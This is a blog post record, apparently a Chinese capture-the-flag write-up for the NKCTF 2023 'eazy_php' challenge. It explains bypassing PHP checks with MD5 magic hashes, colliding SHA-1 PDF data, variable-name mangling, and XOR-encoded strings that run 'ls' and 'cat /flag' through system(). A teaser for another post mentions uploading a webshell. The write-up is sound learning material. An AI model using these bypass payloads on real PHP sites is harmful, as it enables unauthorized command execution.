{"title":"nkctf-2023-eazy_php","uid":"7681339df153dad872cbe7903af30788","slug":"nkctf-2023-eazy-php","date":"2023-03-30T12:05:41.000Z","updated":"2023-03-31T09:53:46.061Z","comments":true,"path":"api/articles/nkctf-2023-eazy-php.json","keywords":null,"cover":[],"content":"<p><img src=\"/images/nkctf-2023-eazy-php/1.png\"></p>\n<p>第一个if要求输入a和b，要求a不等于b但是a，b的MD5值相等，采用的是弱比较</p>\n<p>令a&#x3D;QNKCDZO，b&#x3D;240610708</p>\n<p>二者的md5值表示为科学计数法且前缀都为0e，0的多少次方都是0，通过</p>\n<p>第二个if要求c和d不相等但是sha1值相等，采用强比较</p>\n<p>Google提出了两个两个SHA1值相同而不一样(SHA256的值不通)的pdf文件</p>\n<p>c&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p>\n<p>第三个if要求e不等于114514且e的取整等于114514，令e&#x3D;114514.4</p>\n<p>第四个if要求传入NS_CTF.go成功，但是php不允许变量中含有.，通过get或post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说是无法构造NS_CTF.go的，但PHP中有一个特性是如果传入[，它被转化为 _之后，后面的字符就会被保留下来不会被替换</p>\n<p>构造NS[CTF.go&#x3D;1</p>\n<p>第五个if要求输入的cmd不为空，直接输入即可</p>\n<p>第六个if匹配cmd中的内容，要求不能含有0-9以及所有的大小写字母，用位运算符来构造绕过</p>\n<p>通过异或拼凑需要的语句</p>\n<p>构造payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n即：$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%22%0c%08&quot;^&quot;%60%7b%22);&amp;%ff&#x3D;system\n\n$&#123;_GET&#125;&#123;%ff&#125;(&quot;ls&quot;);&amp;%ff&#x3D;system\n\n%0c%08%01%00&quot;^&quot;%60%7b%21%2f &#x2F;&#x2F;ls &#x2F;\n\n%03%01%09%01%00%06%06%06%06%0c%0c%0c%0c%01%01%01%01%07%07%07%07&quot;^&quot;%60%60%7d%21%2f%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60 &#x2F;&#x2F; cat &#x2F;flag\n\n得到flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n","feature":true,"text":" 第一个if要求输入a和b，要求a不等于b但是a，b的MD5值相等，采用的是弱比较 令a&#x3D;QNKCDZO，b&#x3D;240610708 二者的md5值表示为科学计数法且前缀都为0e，0的多少次方都是0，通过 第二个if要求c和d不相等但是sha1值相等，采用强比较 ...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ZJCTF 2019-NiZhuanSiWei","uid":"436ac58f1a1d63b58d899e0fdddfbd9b","slug":"ZJCTF-2019-NiZhuanSiWei","date":"2023-04-01T11:57:05.000Z","updated":"2023-04-01T12:13:23.883Z","comments":true,"path":"api/articles/ZJCTF-2019-NiZhuanSiWei.json","keywords":null,"cover":[],"text":" 进入题目，分析源码 首先要通过GET方式输入变量text，file_get_contents() 的功能是把整个文件读入一个字符串中。 即要求输入的text为一个text类型的文件且内容为welcome to the zjctf 可以通过PHP协议中的php:&#x2F;&#x...","link":"","photos":[],"count_time":{"symbolsCount":"1.3k","symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"MRCTF2020-你传马呢","uid":"cac40bacea4478d0db1ca783798bed19","slug":"MRCTF2020-你传马呢","date":"2023-03-28T12:08:28.000Z","updated":"2023-03-30T12:03:00.225Z","comments":true,"path":"api/articles/MRCTF2020-你传马呢.json","keywords":null,"cover":[],"text":" 进入题目，是一个文件上传题 准备一个一句话木马a.php 尝试上传 上传失败 在木马文件中加入png文件头，并将后缀改为.png上传成功 但是不能直接使用 准备一个a.htaccess文件内容如下 SetHandler application&#x2F;x-httpd-php ...","link":"","photos":[],"count_time":{"symbolsCount":251,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}